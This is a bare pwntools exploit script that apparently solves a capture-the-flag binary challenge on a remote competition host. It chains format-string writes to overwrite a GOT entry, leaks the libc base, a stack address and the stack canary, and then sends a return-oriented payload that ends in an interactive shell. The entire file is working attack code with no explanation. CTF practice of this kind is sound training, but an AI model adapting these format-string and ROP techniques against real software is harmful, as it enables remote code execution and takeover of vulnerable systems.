from pwn import *

libc_printf = 0x606f0
pop_rbp = 0x40126c
bss = 0x404060

# with gdb.debug("./go",'b *go+190') as r:
# with remote("localhost", 1447) as r:
with remote("challs.actf.co", 31312) as r:
	r.sendline(b'%4502c%8$hnAAAAA' + p64(0x404018) + b"A"*16)
	r.readuntil(b"See you around, ")
	r.sendline(b'%7$sAAAA' + p64(0x404028) + b"A"*24)
	r.readuntil(b"See you around, ")
	libc_base = u64(r.readn(6) + b'\0\0') - libc_printf
	print(f"{libc_base = :x}")
	r.sendline(b'%12$016lx' + b"A"*31)
	r.readuntil(b"See you around, ")
	stack_leak = int(r.readn(16), 16)
	print(f"{stack_leak = :x}")
	r.sendline(b'%11$016lx%8$hhnA' + p64(stack_leak - 0x88))
	r.readuntil(b"See you around, ")
	canary = int(r.readn(16), 16)
	print(f"{canary = :x}")
	r.sendline((p64(0) + p64(0) + p64(libc_base + 0x41c48) + p64(0) + p64(0) + p64(pop_rbp) + p64(bss + 0x48) + p64(libc_base + 0xebce2)).ljust(40, b"A"))
	r.readuntil(b"See you around, ")
	r.sendline(b'A'*40 + p64(canary) + b'A'*8 + p64(libc_base + 0x41c48))
	r.interactive()
